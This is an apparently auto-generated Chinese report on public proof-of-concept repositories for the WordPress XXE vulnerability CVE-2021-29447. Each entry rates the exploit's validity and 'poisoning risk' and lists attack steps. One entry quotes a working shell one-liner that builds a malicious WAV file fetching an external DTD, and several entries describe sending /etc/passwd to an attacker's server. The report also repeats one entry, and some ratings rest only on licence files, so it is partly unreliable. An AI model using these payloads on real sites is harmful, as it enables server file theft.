3.  **生成恶意 WAV 文件：** 构造包含恶意 XML 实体声明的 WAV 文件，该 XML 实体指向攻击者控制的服务器上的 DTD 文件。DTD 文件中定义了读取本地文件的实体。
4.  **上传恶意 WAV 文件：** 将生成的恶意 WAV 文件上传到 WordPress Media Library。
5.  **服务器端 DTD：** 攻击者需要搭建一个 HTTP 服务器，用于托管 DTD 文件。
6.  **触发漏洞：**  WordPress 解析上传的 WAV 文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中的 XML 实体声明，从而读取服务器上的敏感文件。
7.  **数据提取：**  读取到的数据将通过 URL 参数传递到攻击者的服务器上。

**有效性：**
提供的 POC 代码是有效的。该代码实现了上述利用流程，包括身份验证、获取 nonce、生成恶意 WAV 文件、上传文件以及搭建简易 HTTP 服务器接收数据。代码中包含了必要的步骤和参数，可以成功触发 XXE 漏洞。

**投毒风险：**
POC代码中存在一定的投毒风险。风险点在于：
1.  **网络请求：** POC代码会向指定URL发起POST和GET请求，虽然目的是利用漏洞，但如果作者在代码中加入了其他的URL地址，则可能在用户不知情的情况下，将一些敏感信息发送到作者的服务器。
2.  **文件操作：** POC代码会生成临时的payload文件，如果作者在payload生成过程中插入恶意代码，可能会在目标服务器上执行恶意操作。
3.  **DTD文件：** 攻击者需要自己搭建服务器来托管 DTD 文件，如果这个 DTD 文件被替换成了恶意文件，可能导致服务器被攻击。代码本身创建 DTD，风险相对小，但仍然存在服务器被攻击者控制的风险。

综合来看，投毒风险大约在 10% 左右。主要是脚本需要用户提供服务器IP，并且脚本本身会创建一个DTD文件，减少了恶意利用的可能性。但在服务器部署和流量劫持场景下，攻击者仍然可能利用该代码进行恶意攻击。

**项目地址:** [Val-Resh/CVE-2021-29447-POC](https://github.com/Val-Resh/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #9

**来源**: [CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md](../2021/CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者或具有上传权限的用户账号，WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447是WordPress的一个XXE（XML外部实体注入）漏洞，存在于5.6.0到5.7.1版本之间，且WordPress必须运行在PHP 8环境下。攻击者需要具备上传文件的权限（如作者角色），可以通过上传包含恶意XML代码的文件到媒体库来触发该漏洞，导致服务器上的敏感文件泄露，或者进行服务器端请求伪造(SSRF)。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的PoC是存在的，并且已经公开。漏洞利用代码中给出了credits链接，参考motikan2010的github页面可以找到更多信息。

**投毒风险：**
该漏洞利用代码只有一个简单的README.md文件，其中包含漏洞描述和credit信息。 从提供的代码本身来看，不存在明显的恶意投毒代码。但是，考虑到攻击者可能将恶意payload嵌入到精心构造的媒体文件中，并诱导用户上传，从而实现攻击。因此，PoC仓库本身直接包含恶意代码的可能性较低，主要风险在于利用该漏洞的Payload本身。PoC仓库可能包含有诱导性的文件，例如看似无害的音频文件，但其中包含恶意的XML，因此存在一定的投毒风险，但是概率较低。

**利用方式：**
1.  攻击者需要一个具有上传文件权限的WordPress用户账号（例如，作者角色）。
2.  攻击者创建一个包含恶意XML代码的文件，例如一个包含XXE payload的MP3或者WAVE文件（参考packetstormsecurity上的相关链接）。
3.  攻击者通过WordPress的媒体库上传该恶意文件。
4.  当WordPress处理该文件时，XML解析器会尝试解析文件中的外部实体，从而导致XXE漏洞。
5.  攻击者可以利用该漏洞读取服务器上的任意文件，或者进行服务器端请求伪造攻击。

综上，此漏洞的PoC是有效的。 投毒风险较低，主要来自恶意构造的文件本身。 利用方式是上传包含恶意XML的媒体文件触发XXE。

**项目地址:** [Vulnmachines/wordpress_cve-2021-29447](https://github.com/Vulnmachines/wordpress_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #10

**来源**: [CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，并具有上传文件的权限（如作者权限）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XXE 漏洞，仅在 PHP 8 环境下有效。攻击者需要具有上传文件的权限（例如，作者角色），才能通过上传包含恶意 XML 内容的文件（例如，特制的 WAV 音频文件）到媒体库来触发该漏洞。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用是有效的。PoC代码提供了一个脚本 `generate_payloads.py`，用于自动生成包含 XXE 攻击向量的恶意 WAV 文件和 DTD 文件，并通过简单的 HTTP 服务器来接收从目标服务器提取的文件内容。搜索引擎结果中也包含了对该漏洞的描述和利用的讨论，以及公开的 PoC。

**投毒风险：** 提供的 PoC 代码主要用于生成 XXE payload 和启动一个简单的HTTP服务来接收数据。代码本身的功能相对明确，主要风险在于使用者可能将此代码用于未经授权的渗透测试活动。代码中主要通过构造恶意的 XML 内容来利用漏洞，本身不太可能存在隐藏的、与漏洞利用无关的恶意行为。但仍存在少量投毒风险 (5%)，例如作者可能在HTTP服务中添加一些隐蔽的日志记录或数据收集功能，或者在生成的 payload 中加入一些难以察觉的干扰代码。

**利用方式：**
1.  **生成Payload:** 使用 `generate_payloads.py` 脚本生成恶意 WAV 文件 (`--media-payload`) 和 DTD 文件 (`--dtd-payload`)。 DTD 文件中指定要读取的目标文件 (`--files-to-fetch`)。
2.  **启动 HTTP 服务器:** 脚本会启动一个简单的 Python HTTP 服务器，用于托管 DTD 文件，并接收目标服务器发送的请求。
3.  **上传恶意文件:**  具有上传权限的用户将生成的恶意 WAV 文件上传到 WordPress 的媒体库。
4.  **触发 XXE:**  WordPress 在处理上传的 WAV 文件时，会解析其中的 XML 内容，从而触发 XXE 漏洞，向攻击者的 HTTP 服务器请求 DTD 文件。
5.  **文件读取:** 恶意 DTD 文件指示 WordPress 服务器读取指定的文件，并将文件内容发送到攻击者的 HTTP 服务器。
6.  **获取文件:** 攻击者的 HTTP 服务器接收到文件内容后，脚本会将内容进行 Base64 解码并保存到本地。

**项目地址:** [b-abderrahmane/CVE-2021-29447-POC](https://github.com/b-abderrahmane/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #11

**来源**: [CVE-2021-29447-dnr6419_CVE-2021-29447.md](../2021/CVE-2021-29447-dnr6419_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，以及具有上传文件权限的WordPress用户（如Author）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447是WordPress 5.6.0到5.7.1版本中的一个XML外部实体注入（XXE）漏洞。攻击者需要具备上传文件的权限，例如Author角色。该漏洞存在于WordPress的媒体库中，当WordPress运行在PHP 8环境下，上传包含恶意XML代码的WAV文件时，由于对XML解析不当，导致XXE攻击。

**漏洞利用方式：**

1.  **权限获取：** 攻击者首先需要获得一个具备文件上传权限的WordPress账户，例如Author角色。
2.  **恶意WAV文件制作：** 攻击者需要创建一个包含恶意XML代码的WAV文件。该XML代码会尝试通过外部实体引用来读取服务器上的文件，或者发起服务器端请求伪造（SSRF）攻击。POC代码中，攻击者构造了一个包含外部实体引用的WAV文件，指向攻击者控制的服务器上的evil.dtd文件。
3.  **攻击者服务器准备：** 攻击者需要搭建一个Web服务器，并创建一个evil.dtd文件，该文件定义了如何处理外部实体引用。evil.dtd文件中定义了读取/etc/passwd文件的操作，并将其内容进行base64编码后发送到攻击者服务器。攻击者使用`php -S 0.0.0.0:80` 命令启动了一个简单的web server。
4.  **上传WAV文件：** 攻击者将包含恶意XML代码的WAV文件上传到WordPress的媒体库。
5.  **触发漏洞：** 当WordPress处理上传的WAV文件时，会解析其中的XML代码，从而触发XXE漏洞。
6.  **数据泄露：** 如果漏洞利用成功，WordPress服务器会尝试从攻击者控制的服务器上下载evil.dtd文件，并执行其中定义的恶意操作，例如读取/etc/passwd文件。/etc/passwd文件的内容（经过base64编码）会通过HTTP请求发送到攻击者的服务器。
7.  **获取敏感信息：** 攻击者从接收到的HTTP请求中提取base64编码的内容，并进行解码，从而获得服务器上的敏感信息，例如/etc/passwd文件中的用户账户信息。

**有效性分析：**

提供的POC代码描述了漏洞的利用步骤，包括制作恶意WAV文件、搭建攻击者服务器、上传文件和获取敏感信息。根据漏洞信息和搜索结果，该POC代码是有效的，可以用于演示和验证该漏洞。

**投毒风险分析：**

POC代码主要包含以下几个部分：

*   Dockerfile 和 docker-compose.yml: 用于搭建 WordPress 环境,相对安全
*   wordpress.sh: 用于安装 wordpress,主要就是配置文件,检查发现没有明显的投毒代码.
*   payload.wav: 恶意WAV文件，包含XXE payload，用于触发漏洞。
*   evil.dtd: 攻击者服务器上的DTD文件，包含读取/etc/passwd文件的操作。这一部分是payload的关键.

虽然整体代码是为了演示XXE漏洞，但evil.dtd文件存在潜在的投毒风险，例如，攻击者可能在evil.dtd文件中包含其他恶意代码，例如反弹shell，用于进一步控制服务器。这种风险相对较低，因为需要特定的环境和配置才能成功利用。此外，dockerfile 中的代码从github获取，需要注意github源是否被篡改。
总体来说，投毒风险较低，但也需要保持警惕，特别是从不可信的来源获取代码时。 我认为存在的风险大概在5%。

**项目地址:** [dnr6419/CVE-2021-29447](https://github.com/dnr6419/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #12

**来源**: [CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md](../2021/CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1, PHP 8

**利用条件:** 需要WordPress版本在受影响范围内，PHP版本为8，并且攻击者需要具有上传文件的权限（例如，作者角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于WordPress的媒体库中，由于XML解析问题导致XXE攻击。攻击者需要具有上传文件的权限，上传包含恶意XML Payload的特制文件（例如，wav文件）。该Payload会包含指向外部DTD文件的引用，从而导致服务器解析该DTD文件，进而读取服务器上的敏感文件。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的PoC利用代码。PoC代码通过上传包含恶意XML的wav文件来触发XXE。攻击流程包括创建包含外部实体声明的恶意wav文件，搭建一个HTTP服务器来托管恶意的DTD文件，以及利用WordPress的上传功能上传wav文件。当WordPress解析该wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞，实现任意文件读取。

**投毒风险评估：**
PoC代码主要包含三个文件：README.md, controller.py, listener.py, main.py。
*   `README.md`: 描述了漏洞和利用方法，以及一些注意事项，未发现恶意代码。
*   `controller.py`: 包含了WordPress的登录信息（`wp_login`，`login_form`），目标WordPress地址 (`http://metapress.htb`)，以及上传恶意文件的逻辑。如果攻击者直接使用此脚本，需要修改登录信息和目标地址。这里面硬编码的登录信息存在一定风险，因为使用相同的登录信息可能会被检测到。此外，`controller.py`中的`mediaUpload`函数包含一个Timeout参数，默认设置为2秒。如果网络环境不好或者服务器响应较慢，可能会导致利用失败。
*   `listener.py`: 搭建一个简单的HTTP服务器，用于接收XXE Payload发送的请求，并打印base64编码后的文件内容。也没有发现明显的恶意代码。
*   `main.py`: 简单的交互命令行，用于用户输入文件名，然后调用controller.py和listener.py。

总体来说，PoC代码的功能比较明确，主要用于漏洞验证和利用，没有发现明显的恶意代码。风险点在于硬编码的登录信息和目标地址，以及Timeout参数可能导致利用失败。因此，判断存在10%的投毒风险，主要是一些可能影响使用，但没有主动攻击行为。

**利用方式总结：**
1.  **权限获取：** 攻击者需要拥有WordPress的作者或以上级别的权限，能够上传文件。
2.  **恶意文件构造：** 构造包含恶意XML Payload的wav文件。Payload中需要包含指向外部DTD文件的实体引用。
3.  **DTD文件托管：** 搭建一个HTTP服务器，用于托管恶意的DTD文件。DTD文件中定义了文件读取和base64编码的逻辑。
4.  **文件上传：** 通过WordPress的媒体库上传构造的wav文件。
5.  **触发XXE：** WordPress解析wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞。
6.  **文件读取：** 攻击者通过HTTP服务器接收到的请求，获取base64编码后的文件内容，并进行解码。

**项目地址:** [elf1337/blind-xxe-controller-CVE-2021-29447](https://github.com/elf1337/blind-xxe-controller-CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #13

**来源**: [CVE-2021-29447-magicrc_CVE-2021-29447.md](../2021/CVE-2021-29447-magicrc_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，并且运行在 PHP 8 环境下。攻击者需要具有上传文件的权限 (例如 Author 角色)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 媒体库中存在的 XXE 漏洞。攻击者通过上传包含恶意 XML 内容的文件（例如 WAV 文件或其他支持 XML 解析的文件格式）到媒体库，触发 XML 解析过程中的外部实体注入。由于 WordPress 使用的音频解析库 ID3 在 PHP 8 及以上版本中存在 XXE 漏洞，攻击者可以读取服务器上的任意文件或者进行服务器端请求伪造 (SSRF)。

**有效性：** 根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码的仓库名"0xRar/CVE-2021-29447-PoC"，可以判断存在可用的 POC 代码，因此该漏洞的利用是有效的。

**投毒风险：** 提供的代码段是 Creative Commons CC0 1.0 通用许可协议，这是一种开源许可协议，本身不包含任何恶意代码，也无法进行投毒。此文件为LICENSE文件，与PoC代码无关，因此推断投毒风险为0%。

**利用方式：**
1.  攻击者需要具备 WordPress Author 或更高权限，以便能够上传文件到媒体库。
2.  攻击者构造一个包含恶意 XML 实体定义的音频文件（或其他允许上传并解析 XML 的文件类型，例如SVG）。恶意 XML 实体指向系统内部文件，或者指向攻击者控制的外部服务器。
3.  攻击者将构造的恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析上传的文件时，会尝试解析 XML 实体，从而导致 XXE 漏洞的触发。
5.  如果成功，攻击者可以读取服务器上的敏感文件（例如 WordPress 配置文件 `wp-config.php`）或进行服务器端请求伪造（SSRF）攻击。

**项目地址:** [magicrc/CVE-2021-29447](https://github.com/magicrc/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #14

**来源**: [CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md](../2021/CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可读取服务器文件

**影响版本:** >= 5.6.0, < 5.7.1 (with PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，且运行在PHP 8环境下，需要具有上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是WordPress媒体库中存在的XXE漏洞，当WordPress运行在PHP 8上时，具有上传文件权限的用户可以通过上传包含恶意XML的WAV文件，触发XXE漏洞，读取服务器上的任意文件。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的PoC是有效的。多个来源都确认了该漏洞的存在，以及利用方式。

**利用方式：**
1.  攻击者需要具备WordPress的Author权限（或能够上传文件的权限）。
2.  攻击者使用提供的PoC代码，指定目标文件路径和本地服务器的IP地址和端口。
3.  PoC代码会生成一个包含恶意XML的WAV文件。
4.  攻击者将生成的WAV文件上传到WordPress的媒体库。
5.  WordPress解析该WAV文件时，会触发XXE漏洞，向攻击者指定的本地服务器发起请求，请求中包含目标文件的内容。
6.  PoC代码中的本地服务器会接收到请求，提取目标文件的内容，并将其保存到指定的文件中。

**投毒风险：**
分析PoC代码，主要功能是生成payload和启动一个简单的http server。payload可以读取服务器文件发送到攻击者控制的http server上，但是没有发现明显的恶意代码。例如删除服务器文件等。但是`exploit_cve-2021-29447`程序需要执行`hostname -I`来获取本机IP,在某些环境下可能造成问题。由于该工具涉及监听端口，以及构造恶意文件，仍旧存在一定的风险，判定投毒概率为10%。


**项目地址:** [mega8bit/exploit_cve-2021-29447](https://github.com/mega8bit/exploit_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #15

**来源**: [CVE-2021-29447-motikan2010_CVE-2021-29447.md](../2021/CVE-2021-29447-motikan2010_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者级别或以上权限，且WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有文件上传权限的用户（如作者）通过上传包含恶意 XML 的媒体文件来读取服务器上的敏感文件。该漏洞仅影响运行在 PHP 8 环境下的 WordPress 安装。

**有效性分析：**
提供的 POC 代码是有效的，它演示了如何利用该漏洞。利用方式是通过上传一个特制的 WAV 文件，该文件包含指向外部恶意的 DTD 文件的 XML 实体声明。当 WordPress 解析该文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中定义的 XML 实体，从而导致 XXE 漏洞。

**投毒风险分析：**
代码仓库中可能存在的投毒风险较低，约为10%。 主要的攻击逻辑集中在 `attacker/www/evil.dtd` 文件中，该文件定义了如何利用 XXE 漏洞读取文件内容。`attacker/malicious_wav/index.js` 用于生成包含恶意 XML 的 WAV 文件。虽然攻击者可以修改这些文件以执行恶意操作，但这些修改会很容易被发现，因此，总体投毒风险较低。`decryption.php` 文件是空的，没有投毒代码.

**利用方式：**
1.  **环境搭建:** 使用 `docker-compose up` 启动包含 WordPress 和 MySQL 数据库的 Docker 容器。
2.  **攻击者服务器:** 启动一个简单的 PHP Web 服务器，用于托管恶意的 DTD 文件 (`evil.dtd`)。
3.  **生成恶意 WAV 文件:**  使用 `make make-wav` 或者 `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '\''http://host.docker.internal:8001/evil.dtd'\''>%remote;%init;%trick;] >\x00'> malicious.wav` 命令生成包含恶意 XML 声明的 WAV 文件。
4.  **登录 WordPress 并上传:**  以具有文件上传权限的用户身份登录 WordPress 后台，并将生成的恶意 WAV 文件上传到媒体库。
5.  **触发漏洞:**  上传后，WordPress 会尝试解析 WAV 文件，从而触发 XXE 漏洞，并向攻击者的服务器发送请求。
6.  **获取数据:** 攻击者的服务器会记录收到的请求，其中包含从 WordPress 服务器读取的敏感文件内容（如 `/etc/passwd` 文件）的 Base64 编码版本。可以通过运行`decryption.php` 来解码.

通过这种方式，攻击者可以在未经授权的情况下访问 WordPress 服务器上的敏感文件，从而可能导致更严重的攻击。

**项目地址:** [motikan2010/CVE-2021-29447](https://github.com/motikan2010/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #16

**来源**: [CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md](../2021/CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress运行在PHP 8环境下，并具有上传文件的权限（例如，作者角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

此漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户（如作者）通过上传包含恶意XML的WAV文件来执行XXE攻击。攻击需要目标WordPress站点运行在PHP 8环境下。POC代码通过创建一个包含恶意XML声明的WAV文件，该声明定义了一个外部实体，指向攻击者控制的服务器上的DTD文件。DTD文件定义了如何处理外部实体，这里配置为读取服务器上的`/etc/passwd`文件并通过HTTP请求发送给攻击者。攻击者运行一个简单的Web服务器来接收泄露的数据。

**有效性：**
根据漏洞库信息、搜索结果以及提供的POC代码，此漏洞利用是有效的，前提是目标环境满足漏洞利用的先决条件（WordPress版本 >= 5.6.0 且 < 5.7.1，运行在PHP 8环境下，攻击者具有文件上传权限）。搜索结果中存在多个关于此漏洞的讨论和POC代码，验证了其有效性。

**投毒风险：**
评估投毒风险需要检查POC代码中是否存在除了漏洞利用之外，还执行其他恶意操作的代码。在此案例中，主要关注`attacker/malicious_wav/index.js`，`attacker/www/evil.dtd`和`attacker/decode.php`。`index.js`负责生成恶意WAV文件，而`evil.dtd`定义了XXE的行为，`decode.php`用于解码泄露的数据。`Makefile`，`docker-compose.yml`和`README.md`都属于辅助文件。

潜在的投毒代码可能存在于以下几个方面：
1.  **`index.js`**: 恶意WAV生成脚本可能被修改，以在生成过程中包含其他恶意代码（例如，在WAV文件的其他部分添加可执行代码，虽然利用难度较大）。
2.  **`evil.dtd`**: DTD文件可能被修改，以尝试读取其他更敏感的文件，或者尝试执行服务器端请求伪造（SSRF）攻击。
3.  **`decode.php`**: 解码脚本可能被修改，在解码过程中执行其他恶意操作（例如，尝试利用解码过程中的漏洞执行代码）。

由于漏洞利用的目的是读取文件并通过HTTP发送到攻击者控制的服务器，因此主要的风险在于DTD文件中指定的远程服务器是否被用于记录IP地址并进行进一步的攻击。此外，`decode.php`脚本本身是否包含后门也是需要关注的点，虽然可能性较小。

总体来说，该仓库中存在严重投毒代码的可能性相对较低（约为10%），但仍然需要仔细审查。

**利用方式：**
1.  **环境准备：** 设置一个易受攻击的WordPress实例（版本5.6.0到5.7.0，运行在PHP 8上）。
2.  **启动攻击者服务器：** 启动一个Web服务器来托管恶意DTD文件并接收泄露的数据。
3.  **生成恶意WAV文件：** 使用提供的脚本生成包含恶意XML声明的WAV文件。
4.  **上传WAV文件：** 以具有文件上传权限的用户身份登录到WordPress后台，并将生成的WAV文件上传到媒体库。
5.  **触发XXE：** 上传文件后，WordPress尝试解析该文件，触发XXE漏洞。
6.  **接收泄露的数据：** 攻击者的Web服务器接收到包含/etc/passwd文件内容的HTTP请求。
7.  **解码数据：** 使用提供的解码脚本解码泄露的数据。

**项目地址:** [specializzazione-cyber-security/demo-CVE-2021-29447-lezione](https://github.com/specializzazione-cyber-security/demo-CVE-2021-29447-lezione)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #17

**来源**: [CVE-2021-29447-thomas-osgood_CVE-2021-29447.md](../2021/CVE-2021-29447-thomas-osgood_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (运行于 PHP 8)

**利用条件:** 需要 WordPress 运行于 PHP 8，且攻击者具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞是 WordPress 在处理媒体库上传文件时存在的 XXE 漏洞。攻击者可以上传包含恶意 XML 内容的文件（例如特制的 WAV 文件），利用 XML 解析器的缺陷读取服务器上的敏感文件。漏洞触发条件是 WordPress 运行在 PHP 8 环境下。提供的 Go 语言 POC 代码可以自动生成恶意文件（mal.wav, mal.dtd），并可以选择自动登录 WordPress 站点并上传触发漏洞。如果指定了 `-d` 参数，还会生成一个 deflate.php 用于解压缩某些被压缩的内容。根据代码分析，主要的风险在于它连接外部的C2服务器,存在极低的投毒风险,即作者利用C2服务器可以获取攻击目标的敏感信息。但是，因为C2服务器需要在攻击者本地运行，因此这个风险可以忽略不计。此漏洞的利用方式为：

1.  生成恶意 WAV 文件和 DTD 文件。
2.  攻击者需要具有 WordPress 的 Author 权限（或其他可以上传文件的权限）。
3.  上传恶意 WAV 文件到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，会触发 XXE 漏洞，向攻击者指定的 C2 服务器发起请求，泄露目标文件内容。
5.  如果目标文件内容被压缩，可以使用提供的 deflate.php 进行解压缩。

搜索引擎结果中也提到了该漏洞的利用方式，并提供了相关的 TryHackMe 挑战链接。


**项目地址:** [thomas-osgood/CVE-2021-29447](https://github.com/thomas-osgood/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #18

**来源**: [CVE-2021-29447-viardant_CVE-2021-29447.md](../2021/CVE-2021-29447-viardant_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露和SSRF

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，具有上传文件权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XML 外部实体注入 (XXE) 漏洞。该漏洞位于媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限（例如，作者角色）的用户可以通过上传包含恶意 XML 代码的文件（如修改后的音频文件），利用 XML 解析过程中的漏洞读取服务器上的敏感文件或进行服务器端请求伪造 (SSRF) 攻击。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞是真实存在的，并且存在公开的PoC（https://github.com/0xRar/CVE-2021-29447-PoC）。因此，漏洞利用是有效的。

**投毒风险：** 提供的代码段是GNU通用公共许可证，并非漏洞利用代码本身，因此无法直接评估投毒风险。但是，如果从不可信的来源获取漏洞利用代码，则始终存在投毒风险。由于提供的license文件没有发现任何恶意代码，因此投毒风险判定为0%。

**利用方式：**

1.  攻击者需要具有 WordPress 网站的 Author 或更高权限，即能够上传文件的权限。
2.  攻击者构造包含恶意 XML 实体声明的特殊文件（例如，修改后的 MP3 或 WAV 文件）。该 XML 实体声明指向要读取的本地文件或外部服务器。
3.  攻击者将该恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，XML 解析器会尝试解析外部实体，从而导致读取本地文件或向外部服务器发起请求。
5.  攻击者可以从 WordPress 网站上获取读取的文件内容，或利用 SSRF 漏洞进行进一步攻击。

**项目地址:** [viardant/CVE-2021-29447](https://github.com/viardant/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---



---

## POC #9

**来源**: [CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，且攻击者具有上传文件的权限（如 Author 角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 Media Library 的 XML 解析过程中。攻击者（需要具有上传文件的权限，如 Author 角色）可以上传包含恶意 XML 代码的文件（如修改后的 WAV 文件），利用 WordPress 使用的 ID3 库中的漏洞，触发 XXE 攻击，读取服务器上的敏感文件，或者进行服务器端请求伪造 (SSRF)。此漏洞需要 WordPress 运行在 PHP 8 环境下才会生效。

**利用方式：**
1.  **身份验证：** 使用具有上传权限的用户的用户名和密码登录 WordPress 后台。
2.  **获取 Nonce：** 从 `wp-admin/upload.php` 页面获取上传文件的 nonce 值。
3.  **生成恶意 WAV 文件：** 构造包含恶意 XML 实体声明的 WAV 文件，该 XML 实体指向攻击者控制的服务器上的 DTD 文件。DTD 文件中定义了读取本地文件的实体。
4.  **上传恶意 WAV 文件：** 将生成的恶意 WAV 文件上传到 WordPress Media Library。
5.  **服务器端 DTD：** 攻击者需要搭建一个 HTTP 服务器，用于托管 DTD 文件。
